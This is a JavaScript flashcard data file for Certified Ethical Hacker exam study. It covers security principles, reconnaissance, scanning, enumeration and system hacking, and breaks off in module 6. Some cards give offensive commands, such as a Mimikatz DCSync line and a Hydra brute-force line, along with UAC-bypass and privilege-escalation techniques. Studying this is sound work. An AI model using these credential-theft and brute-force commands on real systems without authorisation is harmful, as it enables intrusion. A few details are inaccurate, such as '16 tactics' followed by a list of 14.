// CEHStudy Flashcard Data — All 20 Modules
// Expanded with content from multiple source repos

const CEH_DATA = {
    modules: [
        {
            id: 1,
            title: "Introduction to Ethical Hacking",
            sections: [
                {
                    title: "Information Security Principles",
                    cards: [
                        { q: "What are the five pillars of information security?", a: "1) Confidentiality — data accessible only to authorized users\n2) Integrity — preventing unauthorized changes to data\n3) Availability — resources available to authorized users when needed\n4) Authenticity — ensuring files, communications, and identities are genuine\n5) Non-repudiation — guarantee that a sender cannot deny sending a message" },
                        { q: "What is the CIA triad?", a: "Confidentiality, Integrity, Availability — the three core principles of information security.\n- Confidentiality: Protected via passwords, encryption, access controls\n- Integrity: Ensured via hash functions, version control, checksums\n- Availability: Protected from DoS attacks, ensured via redundancy and backups" },
                        { q: "What is risk analysis formula?", a: "Risk = Threats × Vulnerabilities × Impact\nAlternative: Risk = Threat × Vulnerability × Asset Value\nRisk Level = Consequence × Likelihood\n\nKey terms:\n- ARO (Annual Rate of Occurrence): how often a threat event occurs per year\n- SLE (Single Loss Expectancy): expected monetary loss from one occurrence\n- ALE (Annualized Loss Expectancy): SLE × ARO" },
                        { q: "What is BCP (Business Continuity Plan)?", a: "A documented process to ensure that essential functions can continue during and after a disaster. Includes incident response procedures, backup systems, recovery sites, and communication plans." },
                        { q: "What is IR (Incident Response) and its phases?", a: "Incident Response — structured approach to handling security breaches.\nPhases:\n1) Preparation — tools, training, policies\n2) Recording and Assignment — document and assign incident\n3) Triage — assess severity and impact\n4) Notification — alert stakeholders\n5) Containment — prevent further damage\n6) Evidence Gathering — collect and preserve forensic data\n7) Eradication — remove threat completely\n8) Recovery — restore systems to normal operation\n9) Post-Incident Activity — lessons learned, report generation" },
                        { q: "What is Information Assurance (IA)?", a: "IA starts with policy, ends with people, and everything in between is risk management.\nProcess: Plan → Design → Find Problems → Get Resources → Plan Fixes → Apply Controls → Verify → Train People" },
                        { q: "What is Continual/Adaptive Security Strategy?", a: "An ongoing approach to security that evolves with threats. Formula: RISK = Threats × Vulnerabilities × Impact. Focuses on continuous monitoring, threat intelligence, and adaptive controls." },
                        { q: "What are Indicators of Compromise (IOCs)?", a: "Clues left by attackers that indicate a breach has occurred.\nTypes:\n- Email indicators: specific senders, addresses, subject lines, attachment types\n- Network indicators: URLs, domains, IP addresses\n- Host-based indicators: specific filenames, file hashes, registry keys\n- Behavioral indicators: PowerShell execution, remote command execution" }
                    ]
                },
                {
                    title: "Cyber Kill Chain & MITRE ATT&CK",
                    cards: [
                        { q: "What is the Cyber Kill Chain?", a: "A framework by Lockheed Martin that identifies phases of a cyber attack:\n1) Reconnaissance — gathering data, identifying vulnerabilities\n2) Weaponization — creating malicious payload with exploits/backdoors\n3) Delivery — sending payload to target (email, USB, web)\n4) Exploitation — executing delivered code on target system\n5) Installation — installing malicious application (backdoor, malware)\n6) Command and Control (C2) — establishing C2 channel for data exchange\n7) Actions and Objectives — performing mission objectives: stealing data, destroying systems" },
                        { q: "What is MITRE ATT&CK framework?", a: "A nonprofit knowledge base of adversary tactics and techniques based on real-world observations. Used to classify and prepare for specific attacks.\n\nStructure:\n- Tactics: WHY hacker performs action (e.g., Initial Access, Persistence)\n- Techniques: HOW hackers achieve goals\n- Subtechniques: Lower-level description of adversarial behavior\n- Procedures: Specific implementation examples in the wild\n\n16 Tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact" },
                        { q: "What is the Diamond Model of Intrusion Analysis?", a: "A model for describing cyber intrusions with four core components:\n- Adversary (WHO): APT groups, cybercriminals, insiders, hacktivists\n- Capability (WHAT): Malware, exploits, ransomware, tools used\n- Infrastructure (WHERE): C2 servers, malicious domains, IP addresses\n- Victim (WHO TARGETED): Organizations, individuals, systems" },
                        { q: "What is Cyber Threat Intelligence (CTI)?", a: "Evidence-based knowledge about threats that helps organizations make better security decisions.\n\nTypes:\n- Strategic: For executives (trends, threat landscapes)\n- Tactical: For security teams (TTPs, indicators)\n- Operational: For incident response (attack timing, targets)\n- Technical: For systems/SIEM/IDS (IOCs, signatures)\n\nLifecycle: Direction → Collection → Processing → Analysis → Dissemination → Feedback" },
                        { q: "What is Threat Modeling?", a: "Process of identifying what can go wrong, how systems can be attacked, and how to mitigate risks.\nSteps:\n1) Identify assets and data\n2) Create attack trees\n3) Identify threats (STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)\n4) Mitigate threats\n5) Validate assumptions" }
                    ]
                },
                {
                    title: "Attack Types & Pen Test Phases",
                    cards: [
                        { q: "What are the types of threat actors?", a: "- White Hat: Ethical hackers with authorization\n- Black Hat: Malicious hackers seeking personal gain\n- Gray Hat: Between white and black — no authorization but typically no malicious intent\n- Script Kiddies: Unskilled attackers using pre-made tools\n- Cyber Terrorists: Motivated by religious/political beliefs\n- State-Sponsored: Employed by nation states, usually against other nations\n- Hacktivists: Motivated by political agenda, defacing/disabling websites\n- Hacker Teams: Skilled hackers with shared resources\n- Industrial Spies: Corporate espionage for competitive advantage\n- Insiders: Trusted users carrying attacks from within\n- Criminal Syndicates: Organized crime for financial gain" },
                        { q: "What are the types of cyber attacks?", a: "- Passive Attack: Monitoring efforts like sniffing and eavesdropping — data not altered\n- Active Attack: Active attempts to change/alter/delete data — higher risk of discovery\n- Close-in Attacks: Physically close to target (shoulder surfing)\n- Insider Attacks: By people with existing access\n- Distribution Attacks: Carried out before target system is delivered to customer" },
                        { q: "What are the Pen Test phases?", a: "1) Preparation — define scope, types of attacks allowed, team assignments, rules of engagement\n2) Assessment — actual penetration testing (reconnaissance, scanning, exploitation)\n3) Conclusion (Post-Assessment) — report preparation, findings documentation, recommendations for remediation" },
                        { q: "What is Pretexting?", a: "Creating a fabricated scenario (pretext) to engage the victim and extract information. The attacker researches the target beforehand to create a believable story, often impersonating IT support, bank representative, or law enforcement." },
                        { q: "What is Baiting?", a: "Offering something enticing to the victim to lure them into a trap. Examples: leaving infected USB drives in parking lots, offering free downloads, promising exclusive content in exchange for credentials." },
                        { q: "What are the physical social engineering techniques?", a: "- Eavesdropping: Listening to unauthorized conversations to gather information\n- Shoulder Surfing: Observing target's screen, keyboard, or password entry\n- Dumpster Diving: Searching through trash for sensitive documents\n- Impersonation: Pretending to be a legitimate or authorized person" }
                    ]
                },
                {
                    title: "Ethical Hacking Overview",
                    cards: [
                        { q: "What is ethical hacking?", a: "The authorized practice of circumventing computer systems to identify potential security breaches. Ethical hackers use the same tools and techniques as malicious hackers but with permission and for defensive purposes." },
                        { q: "What are the types of hacking?", a: "1) White Hat — authorized security professionals\n2) Black Hat — malicious hackers\n3) Gray Hat — between white and black, no authorization but typically no malicious intent" },
                        { q: "What is a penetration test?", a: "An authorized simulated cyberattack on a computer system, network, or web application to identify potential security vulnerabilities. It follows a structured methodology including planning, reconnaissance, attacking, and reporting." },
                        { q: "What are the phases of ethical hacking?", a: "1) Reconnaissance (Footprinting)\n2) Scanning\n3) Gaining Access\n4) Maintaining Access\n5) Covering Tracks\n6) Reporting" },
                        { q: "What is the difference between vulnerability assessment and penetration testing?", a: "Vulnerability Assessment identifies and quantifies vulnerabilities (broader, less deep). Penetration Testing actively exploits vulnerabilities to determine business impact (deeper, focused on exploitation)." }
                    ]
                },
                {
                    title: "Ethical Hacking Frameworks",
                    cards: [
                        { q: "What is OSSTMM?", a: "Open Source Security Testing Methodology Manual. A free and open framework for security testing that provides standardized metrics and measurements for penetration testing." },
                        { q: "What is PTES?", a: "Penetration Testing Execution Standard. Provides a comprehensive taxonomy for penetration testing including pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, and reporting." },
                        { q: "What is the NIST SP 800-115?", a: "A guide to information technology security testing that provides guidelines for conducting security testing including planning, testing, and documentation phases. Published by NIST." }
                    ]
                }
            ]
        },
        {
            id: 2,
            title: "Footprinting & Reconnaissance",
            sections: [
                {
                    title: "TCP/IP Networking",
                    cards: [
                        { q: "What are the differences between TCP and UDP?", a: "TCP (Transmission Control Protocol):\n- Connection-oriented with three-way handshake\n- Guaranteed delivery, ordered packets\n- Error checking and flow control\n- Used by: HTTP, HTTPS, FTP, SSH, SMTP, DNS\n\nUDP (User Datagram Protocol):\n- Connectionless, no handshake\n- No guaranteed delivery or ordering\n- Faster, lower overhead\n- Most used protocols: TFTP, DNS, DHCP" },
                        { q: "What is the TCP three-way handshake?", a: "Process to establish a TCP connection:\n1) SYN — Client sends synchronization packet with random sequence number\n2) SYN/ACK — Server acknowledges and sends its own SYN\n3) ACK — Client acknowledges server's SYN, connection established\n\nAfter connection: FIN flags close communications, RST forces termination" },
                        { q: "What are TCP flags and their purposes?", a: "- SYN (Synchronize): Initial connection negotiation\n- ACK (Acknowledgement): Confirms receipt of data\n- RST (Reset): Forces connection termination\n- FIN (Finish): Gracefully closes connection\n- URG (Urgent): Data sent out of band\n- PSH (Push): Forces immediate delivery of data\n- NULL: No flags set (used in NULL scans)\n- XMAS: FIN + URG + PSH flags all set" },
                        { q: "What are packet crafting tools?", a: "Tools for creating custom network packets:\n- NetScanTools Pro\n- Ostinato\n- packETH\n- LANforge FIRE\n- Colasoft Packet Builder\nUsed for testing, scanning, and creating custom protocol packets." }
                    ]
                },
                {
                    title: "Google Advanced Search Operators",
                    cards: [
                        { q: "What are Google Hacking/Advanced Search Operators?", a: "Special operators used to find sensitive information exposed on the web:\n\n| Operator | Purpose |\n|----------|---------|\n| cache: | Displays cached version of webpage in Google's index |\n| link: | Lists pages that have links to specified URL |\n| related: | Lists pages similar to specified URL |\n| info | Shows information Google has about a webpage |\n| site: | Restricts results to given domain |\n| allintitle: | All keywords must be in page title |\n| intitle: | Keywords in page title |\n| allinurl: | All keywords in URL |\n| inurl: | Keywords in URL |\n| location: | Find info for specific location" },
                        { q: "What are Meta Search Engines and FTP Search Engines?", a: "Meta Search Engines (hide user IP): Startpage, MetaGear, etools.ch\n\nFTP Search Engines:\n- NAPALM FTP Indexer\n- FreewareWeb\n- Mamont\n- GlobalFileSearch.com" },
                        { q: "What tools are used for SCADA and IoT discovery?", a: "- Shodan: Search engine for internet-connected devices\n- Censys: Discover devices and services on the internet\n- ZoomEye: Cyberspace search engine for IoT/SCADA devices" }
                    ]
                },
                {
                    title: "DNS Records & Tools",
                    cards: [
                        { q: "What are the common DNS record types?", a: "| Record | Label | Description |\n|--------|-------|-------------|\n| A | Address | Maps hostname to IPv4 address |\n| AAAA | IPv6 Address | Maps hostname to IPv6 address |\n| MX | Mail Exchange | Identifies mail server for domain |\n| NS | Name Server | Identifies authoritative name servers |\n| CNAME | Canonical Name | Maps alias to true hostname |\n| SOA | Start of Authority | Defines DNS zone authority (contains responsible server info) |\n| SRV | Service Record | Specifies service location (LDAP, SIP) |\n| PTR | Pointer | Reverse lookup — maps IP to hostname |\n| RP | Responsible Person | Lists admin/owner of domain |\n| HINFO | Host Information | Stores hardware type and OS |\n| TXT | Text Record | Stores text data for DKIM and SPF records |" },
                        { q: "What DNS footprinting tools are available?", a: "- Fierce: Find subdomains, DNS misconfigurations, IP ranges, internal naming patterns\n- DNSRecon: DNS enumeration, discover hosts and subdomains\n- MxToolBox: DNS and email record checking\n- dig/nslookup: Built-in DNS query tools" },
                        { q: "What is theHarvester tool used for?", a: "theHarvester — Email and subdomain reconnaissance tool.\nUsage: theHarvester -d microsoft -l 200 -b linkedin\n- -d specifies target domain\n- -l limits results (200 in example)\n- -b specifies data source (linkedin, google, bing, etc.)\nCollects: emails, subdomains, hostnames from public sources" }
                    ]
                },
                {
                    title: "WHOIS & RIRs",
                    cards: [
                        { q: "What are the types of WHOIS lookups?", a: "- Thick WHOIS: Stores complete whois information in a searchable database\n- Thin WHOIS: Stores only domain name and points to full whois server\n- Decentralized WHOIS: Complete info managed by independent entities (RIRs for IP addresses)" },
                        { q: "What are Regional Internet Registries (RIRs)?", a: "- ARIN: Americas region\n- AFRINIC: African region\n- APNIC: Asia-Pacific region\n- RIPE NCC: Europe, Middle East, Central Asia\n- LACNIC: Latin America and Caribbean" },
                        { q: "What is IP Geolocation?", a: "The process of mapping IP addresses to physical locations. Tools like IP2Location provide geographic data including country, region, city, latitude/longitude associated with an IP address." }
                    ]
                },
                {
                    title: "Footprinting Automation Tools",
                    cards: [
                        { q: "What are the key automated footprinting tools?", a: "- Maltego: Visual link analysis for determining relationships and real-world links between entities\n- Recon-ng: Web-based reconnaissance framework (open-source, modular)\n- FOCA: Finds metadata and hidden information in scanned documents\n- Subfinder: Fast subdomain discovery tool\n- Osint Framework: Collection of OSINT tools organized by category\n- ReconDog: All-in-one reconnaissance tool (DNS lookup, whois, port scanning)\n- BillCipher: Multi-purpose reconnaissance tool" },
                        { q: "What is FOCA used for?", a: "FOCA (Find Out Come Access) — a tool to find metadata and hidden information in scanned documents. Extracts:\n- Metadata from Office documents (author, company, timestamps)\n- Hidden comments and tracked changes\n- Network paths and usernames from document properties\n- PDF annotations and form data" },
                        { q: "What is Maltego used for?", a: "Maltego — link analysis tool for open-source intelligence and forensics. Visualizes relationships between:\n- People, domains, IPs, URLs\n- Social media accounts\n- Companies and organizations\n- DNS records and infrastructure" }
                    ]
                },
                {
                    title: "Port Numbers & States",
                    cards: [
                        { q: "What are the port number ranges?", a: "- Well Known Ports: 0-1023 (reserved for standard services)\n- Registered Ports: 1024-49,151 (assigned to specific applications)\n- Dynamic/Private Ports: 49,152-65,535 (temporary/ephemeral ports)" },
                        { q: "What are the most important ports and their protocols?", a: "| Port | Protocol | Transport |\n|------|----------|-----------|\n| 20/21 | FTP | TCP |\n| 22 | SSH | TCP |\n| 23 | Telnet | TCP |\n| 25 | SMTP | TCP |\n| 53 | DNS | TCP/UDP |\n| 67/68 | DHCP | UDP |\n| 69 | TFTP | UDP |\n| 80 | HTTP | TCP |\n| 443 | HTTPS | TCP |\n| 445 | SMB | TCP |\n| 3389 | RDP | TCP |" },
                        { q: "What are common port states?", a: "- OPEN: Service is accepting connections\n- CLOSED: No service listening, but port is reachable\n- FILTERED: Firewall blocking packets, no response received\n- OPEN/FILTERED: Cannot determine if open or filtered\n- CLOSED/FILTERED: Cannot determine if closed or filtered\n\nNetstat commands:\n- netstat -an: Display all connections and listening ports\n- netstat -b: Show executable tied to each open port" },
                        { q: "What are TCP connection states (netstat)?", a: "- ESTABLISHED: Active connection being used\n- SYN_SENT: Connection request sent\n- SYN_RECEIVED: Request sent, waiting for response\n- FIN_WAIT_1/2: Waiting for connection close\n- CLOSE_WAIT: Remote side closed the connection\n- TIME_WAIT: Local side closed connection, waiting for final ACK\n- LISTEN: Port is listening for incoming connections" }
                    ]
                },
                {
                    title: "Footprinting Basics",
                    cards: [
                        { q: "What is footprinting?", a: "The process of gathering information about an organization's infrastructure and applications before launching an attack. It is the first phase of ethical hacking and helps identify potential attack vectors." },
                        { q: "What is passive footprinting?", a: "Gathering information without directly interacting with the target system. Examples: searching search engines, checking social media, WHOIS lookups, public records, and company websites." },
                        { q: "What is active footprinting?", a: "Directly interacting with the target system to gather information. Examples: network scanning, ping sweeps, DNS zone transfers, and enumeration. More likely to be detected by security systems." }
                    ]
                },
                {
                    title: "Tools & Techniques",
                    cards: [
                        { q: "What is WHOIS lookup?", a: "A protocol used to query databases for information about who has registered a domain name or IP address. Provides contact details, registration dates, nameservers, and more." },
                        { q: "What is DNS zone transfer?", a: "A mechanism used to replicate DNS records across DNS servers. An attacker can use it (via 'dig axfr' or 'nslookup') to get a complete list of all hosts in a domain's DNS database." },
                        { q: "What Google Hacking is?", a: "Using advanced Google search operators (Google Dorks) to find sensitive information exposed on the web. Examples: site:, filetype:, intitle:, inurl: operators to find databases, config files, and admin panels." }
                    ]
                }
            ]
        },
        {
            id: 3,
            title: "Scanning Networks",
            sections: [
                {
                    title: "Nmap Scan Types & ICMP",
                    cards: [
                        { q: "What are the Nmap scan types?", a: "- SYN Scan (-sS): Stealth half-open scan, sends SYN packets. Most common default scan.\n- Connect Scan (-sT): Full TCP connect — completes three-way handshake.\n- UDP Scan (-sU): Scans UDP ports (DNS, DHCP, SNMP).\n- XMAS Scan (-sX): Sets FIN, PSH, URG flags. Returns RST if port closed.\n- NULL Scan (-sN): No flags set. Same response as XMAS.\n- FIN Scan (-sF): Only FIN flag sent.\n- ACK Scan (-sA): Determines if firewall is stateful or stateless.\n- Idle Scan (-sI): Uses zombie host to scan target (very stealthy)." },
                        { q: "What is Nmap Idle/Zombie Scan?", a: "-sI option — uses an idle 'zombie' host to scan the target, making the scan appear to come from the zombie. Requires:\n1) An idle zombie host with predictable IP ID sequence\n2) The zombie must not be communicating during scan\n3) Target's responses go to zombie, not scanner\nVery stealthy as target never sees actual scanner IP." },
                        { q: "What is Nmap OS Detection?", a: "-O flag enables OS detection by analyzing TCP/IP stack fingerprints.\nNmap sends crafted packets and analyzes:\n- TCP Initial TTL values\n- Window size\n- IP ID sequence generation\n- TCP options ordering\nCompares responses against nmap-os-db database." },
                        { q: "What is ICMP and its message types?", a: "Internet Control Message Protocol — Network layer protocol used for diagnostics.\n\nICMP Code Types:\n- Type 0: Echo Reply (ping response)\n- Type 3: Destination Unreachable\n  - Code 0: Network unreachable\n  - Code 1: Host unreachable\n  - Code 6: Network unknown\n  - Code 9: Network administratively prohibited\n  - Code 13: Communication administratively prohibited\n- Type 4: Source Quench (rate limiting)\n- Type 5: Redirect (route optimization)\n- Type 8: Echo Request (ping)\n- Type 11: Time Exceeded (traceroute)" },
                        { q: "What is a Ping Sweep?", a: "Method to find active machines on a network by sending ICMP Echo Requests. Noisy but effective.\n\nTools:\n- Angry IP Scanner\n- SolarWinds Engineer's Toolset\n- Superscan\n- Advanced IP Scanner\n- PingPlotter\n- Nmap: nmap -sn (ping scan only)" }
                    ]
                },
                {
                    title: "Network Scanning",
                    cards: [
                        { q: "What is port scanning?", a: "The process of sending connection requests to a target's ports to discover which services are running. Types: SYN (stealth), Connect (full), XMAS, NULL, FIN, and Idle scanning." },
                        { q: "What is OS fingerprinting?", a: "Determining the operating system of a target machine by analyzing characteristics of its TCP/IP stack responses. Can be active (sending crafted packets) or passive (observing traffic)." },
                        { q: "What tools are used for network scanning?", a: "Nmap (most popular), Nessus, OpenVAS, Masscan, ZMap, Angry IP Scanner, and Netcat. Nmap is the most widely used with features like port scanning, OS detection, and script engine." }
                    ]
                },
                {
                    title: "Vulnerability Scanning",
                    cards: [
                        { q: "What is a vulnerability scanner?", a: "A tool that automatically identifies known vulnerabilities in systems, networks, or applications by comparing configurations and software versions against databases of known vulnerabilities (CVE)." },
                        { q: "What is the difference between authenticated and unauthenticated scanning?", a: "Authenticated scanning uses valid credentials to log into targets for deeper assessment. Unauthenticated scanning only observes from outside the network, missing many configuration issues." }
                    ]
                }
            ]
        },
        {
            id: 4,
            title: "Enumeration",
            sections: [
                {
                    title: "Enumeration Protocols & Services",
                    cards: [
                        { q: "What is SMTP enumeration?", a: "Using SMTP VRFY, EXPN, or RCPT TO commands to verify email addresses and enumerate users. Many mail servers have these commands disabled but some still allow them.\nTools: smtp-user-enum, Nmap scripts (smtp-enum), Swaks" },
                        { q: "What is LDAP enumeration?", a: "Lightweight Directory Access Protocol — can extract user lists, group memberships, organizational structure.\nDefault ports: 389 (unencrypted), 636 (LDAPS).\nTools: ldapsearch, Quest ActiveRoles Server" },
                        { q: "What is NetBIOS enumeration?", a: "NetBIOS Session Service (port 139) and NetBIOS Name Service (port 137/138).\nCan enumerate: computer names, user names, domains, workgroups.\nTools: nbtscan, enum4linux, rpcclient" },
                        { q: "What is SNMP enumeration?", a: "Using community strings to extract system info, interface stats, routing tables, connected devices.\nCommon defaults: 'public' (read-only), 'private' (read-write).\nTools: snmpwalk, snmpget, Net-SNMP" },
                        { q: "What is enumeration?", a: "The process of extracting user names, hostnames, IP addresses, services, and other details from target systems. It goes beyond scanning to extract actionable intelligence." },
                        { q: "What protocols are commonly enumerated?", a: "1) SNMP (Simple Network Management Protocol)\n2) LDAP (Lightweight Directory Access Protocol)\n3) NMB/NetBIOS\n4) SMTP\n5) FTP\n6) DNS\n7) SMB/CIFS" }
                    ]
                }
            ]
        },
        {
            id: 5,
            title: "Vulnerability Analysis",
            sections: [
                {
                    title: "Vulnerability Assessment Tools & Concepts",
                    cards: [
                        { q: "What are popular vulnerability scanners?", a: "- Nessus: Industry standard, extensive plugin library\n- OpenVAS: Open-source alternative to Nessus\n- Qualys: Cloud-based vulnerability management\n- Nexpose/Rapid7: Comprehensive enterprise scanning\n- Burp Suite: Web application focused\n- Acunetix: Automated web vulnerability scanner" },
                        { q: "What is CVE (Common Vulnerabilities and Exposures)?", a: "A dictionary of publicly disclosed cybersecurity vulnerabilities. Each entry has a unique identifier (e.g., CVE-2024-1234) and description. Maintained by MITRE Corporation." },
                        { q: "What is CVSS scoring?", a: "Common Vulnerability Scoring System — rates vulnerabilities from 0.0 to 10.0:\n- 0.0: None\n- 0.1-3.9: Low\n- 4.0-6.9: Medium\n- 7.0-8.9: High\n- 9.0-10.0: Critical\nBase metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality, Integrity, Availability." },
                        { q: "What is a vulnerability?", a: "A weakness in an information system, system security procedures, internal controls, or implementation that could be exploited by a threat source. Examples: unpatched software, misconfigurations, weak passwords." },
                        { q: "What are false positives in vulnerability scanning?", a: "When a scanner reports a vulnerability that doesn't actually exist. This can happen due to misconfigured scanners, version detection errors, or context-specific exceptions. Requires manual verification." }
                    ]
                }
            ]
        },
        {
            id: 6,
            title: "System Hacking",
            sections: [
                {
                    title: "Windows Password Storage & Authentication",
                    cards: [
                        { q: "How are passwords stored in Windows SAM?", a: "- Windows Security Accounts Manager (SAM) stores hashed passwords (one-way hash)\n- Location: %SystemRoot%\\system32\\config\\SAM → registry HKEY_LOCAL_MACHINE\\SAM\n- Cannot copy SAM file while Windows is running\n- SYSKEY function partially encrypts password hashes\n- Stores LM or NTLM hashed passwords\n- Tools to extract: pwdump7, Mimikatz, DSinternals, hashcat, PyCrack" },
                        { q: "What is NTLM authentication?", a: "- NT LAN Manager (NTLM) — default Windows authentication scheme\n- Does not rely on official protocol specification\n- Vista+ disabled LM hashing (LM hash value blank in later Windows)\n- Process: Client requests access → Server sends challenge → Client computes response → Server verifies (AD or SAM)\n- NTLMv2 is reasonably secure but weaker than Kerberos" },
                        { q: "What is Kerberos authentication?", a: "- Uses secret key cryptography\n- Components: KDC (Key Distribution Center), AS (Authentication Server), TGS (Ticket Granting Server)\n- Upgrade from NTLM\n- Process: Login → Request ticket → Receive TGT (Ticket-Granting Ticket) → Request service access → Receive Service Ticket → Access service" },
                        { q: "What are password dump/interception methods?", a: "- Dumping creds from memory\n- Stealing local copy of SAM database\n- Stealing AD file ntds.dit\n- Extracting SYSKEY boot key\n- Intercepting creds sent over network (passive sniffing, MITM)\n- Capturing plain text passwords, LM, NTLM, NTLMv2, Kerberos tokens" }
                    ]
                },
                {
                    title: "Password Cracking Methods",
                    cards: [
                        { q: "What are the types of password attacks?", a: "Non-electronic: Social engineering, dumpster diving\n\nActive online attacks:\n- Dictionary attack — dictionary file loaded against user accounts\n- Brute force — every combination until cracked\n- Rule-based attack — using partial password info\n- Hybrid — dictionary + modifications (old password patterns)\n- Password spraying — one password across many accounts\n- Hash injection / Pass the Hash (PtH)\n- LLMNR/NBT-NS poisoning (Tool: Responder)\n- Markov-chain attacks\n\nPassive online: Wire sniffing at data link layer\n\nOffline attacks: Recover from hash dump" },
                        { q: "What is Pass the Hash (PtH) attack?", a: "- Inject compromised hash into local session to validate network resources\n- Uses logged-in user hash to log into domain controller\n- Does not require cracking the password first" },
                        { q: "What is LLMNR/NBT-NS poisoning?", a: "- LLMNR (Link Local Multicast Name Resolution) and NBT-NS are Windows name resolution methods for hosts on same link\n- Attacker spoofs responses to intercept authentication\n- Tool: Responder detects and performs poisoning\n- Detection tools: Vindicate, got-responded" },
                        { q: "What is AS-REP Roasting?", a: "- Cracking Kerberos TGT ticket\n- Targets users who do NOT have Kerberos pre-authentication required\n- Requires connectivity to Domain Controller and domain account\n- Extract AS-REP ticket → crack offline for user password" },
                        { q: "What are password cracking tools?", a: "- THC Hydra: hydra -l username -P wordlist.txt target\n- Metasploit auxiliary modules\n- Rubeus (Kerberos attacks)\n- adfsbrute\n- CrackMapExec\n- Hashcat (specify hash mode: hashcat -m 0 for MD5)\n- L0phtCrack — recovers lost MS passwords\n- RainbowCrack — uses pre-calculated rainbow tables\n- Passware Kit, Elcomsoft Distributed Password Recovery" },
                        { q: "What is Password Spraying?", a: "- Targets multiple accounts simultaneously with the same common password\n- Avoids account lockout that single-password brute force would trigger\n- Example: Try 'Password123' against all user accounts" }
                    ]
                },
                {
                    title: "Metasploit Framework",
                    cards: [
                        { q: "What are Metasploit module types?", a: "- Exploit Module: Configure active exploit, verify options, select target, select payload, launch\n- Payload Module: Establishes communication channel between attacker and victim\n  - Singles: Self-contained standalone payloads\n  - Stagers: Sets up network connection between attacker and victim\n  - Stages: Downloaded by stager modules\n- Auxiliary Module: One-time actions (port scanning, DoS, fuzzing). Command: use, exploit/run\n- NOPs Module: Generate no-operation instructions for bloxing buffers. Command: msfgenerate\n- Encoder Module: Hide/encode payloads to avoid detection. Uses polymorphism.\n- Evasion Module: Modify payload behavior to avoid detection (evasion/windows/windows_defender.exe)\n- Post-exploitation Module: Interact with system after compromise (post/windows/gather/enum_logged_on_users)" },
                        { q: "What AI-powered vulnerability exploitation tools exist?", a: "- Nebula: AI-powered vulnerability exploitation\n- DeepExploit: Linked with Metasploit, uses automated penetration testing with AI" }
                    ]
                },
                {
                    title: "Buffer Overflow",
                    cards: [
                        { q: "What is a buffer overflow?", a: "- Buffer = area of adjacent memory locations for runtime data\n- Overflow occurs when more data is written than buffer can hold, overwriting neighboring memory\n- Attackers exploit to inject malicious code, damage files, escalate privileges, gain shell access\n- Vulnerable programs: no boundary checks, older languages, unsafe functions (gets, strcpy), no input validation, improper memory allocation" },
                        { q: "What are types of buffer overflow?", a: "- Stack-based: Static memory allocation (LIFO). PUSH/POP operations. Attacker controls EIP register to replace return address.\n  - EBP: Extended Base Pointer (StackBase)\n  - ESP: Extended Stack Pointer\n  - EIP: Extended Instruction Pointer (key target)\n  - ESI/EDI: Source/Destination Index registers\n- Heap-based: Dynamic runtime allocation. Overwrites object pointers. Inconsistent exploit techniques." },
                        { q: "What is Return Oriented Programming (ROP)?", a: "- Reusing code snippets already existing in the binary, usually in libc or kernel32.dll\n- Chains small code 'gadgets' ending in RET instruction to build arbitrary execution" },
                        { q: "What is Heap Spraying?", a: "- Floods free space of process memory by writing multiple copies of malicious code\n- Used with buffer overflow exploits to increase chance of code execution" },
                        { q: "What tools are used for buffer overflow exploitation?", a: "- Spiking: Crafted TCP/UDP packets to crash target. nc -nv ip port, generate template with STATS\n- Fuzzing: Python scripts with while loops, pattern_create (Metasploit) to find EIP overwrite offset, pattern_offset to locate it\n- Metasploit exploit modules\n- OllyDbg: Windows debugger for analysis" }
                    ]
                },
                {
                    title: "Privilege Escalation",
                    cards: [
                        { q: "What is Privilege Escalation?", a: "- Horizontal: Access resources of authorized user with similar permissions\n- Vertical: Unauthorized user gains access to higher privilege level (user → admin/root)" },
                        { q: "What are DLL/Dylib Hijacking attacks?", a: "- DLL Hijacking (Windows): Placing malicious DLL in application library path. Tool: Spartacus\n- Dylib Hijacking (macOS): Dynamic library attacks. Tool: Dylib Hijack Scanner\n- Dependency Walker and Dylib Hijack Scanner for detection" },
                        { q: "What are Meltdown and Spectre vulnerabilities?", a: "- Spectre: Found in AMD, Apple, ARM, Intel processors. Tricks speculative execution to read restricted data\n- Meltdown: All ARM and Intel CPUs (Apple deployed). Tricks processors into accessing out-of-bounds memory" },
                        { q: "What is the DCSync attack?", a: "- Attacker obtains privileged account with domain replication rights\n- Creates virtual DC similar to original AD\n- Extracts NTLM hashes, enables Golden Ticket attacks\n- Tool: Mimikatz — lsadump::dcsync /domain:(domain) /user:Administrator" },
                        { q: "What is the Golden Ticket attack?", a: "- Post-exploitation technique: forge Ticket Granting Ticket (TGT)\n- Requires compromising KRBTGT account password hash\n- Grants access to ANY service in the domain indefinitely\n- Tool: Mimikatz" },
                        { q: "What is the Silver Ticket attack?", a: "- Steal user credentials and create fake Service Ticket (TGS, not TGT)\n- Grants access to a specific service, not entire domain\n- Tool: Mimikatz" },
                        { q: "What are other Privilege Escalation techniques?", a: "- Named Pipe Impersonation (Metasploit)\n- Unquoted Service Paths\n- Service Object Permissions misconfiguration\n- NFS misconfiguration (port 2049): showmount, mount\n- UAC Bypass: FodHelper Registry, eventvwr Registry, COM handler hijacking\n- Boot/Login Initialization abuse: Logon scripts, RC scripts, StartupItems\n- Group Policy modification: New-GPOImmediateTask\n- ADCS abuse (Active Directory Certificate Services) — Tool: Certipy\n- Access Token Manipulation\n- Parent PID Spoofing\n- Application Shimming (bypass UAC)\n- SID-History Injection\n- COM Hijacking\n- Scheduled Tasks abuse\n- Setuid/Setgid (Linux/macOS)\n- Web Shell on web servers" },
                        { q: "What are Privilege Escalation tools?", a: "- BeRoot: Post-exploitation privilege escalation\n- PowerSploit / PowerView: PowerShell post-exploitation\n- PEASS-ng / WinPEAS: Windows enumeration\n- FullPowers: macOS privilege escalation\n- pwncat: Reverse shell and privilege tools\n- Traitor: Linux privesc" }
                    ]
                },
                {
                    title: "Maintaining Access",
                    cards: [
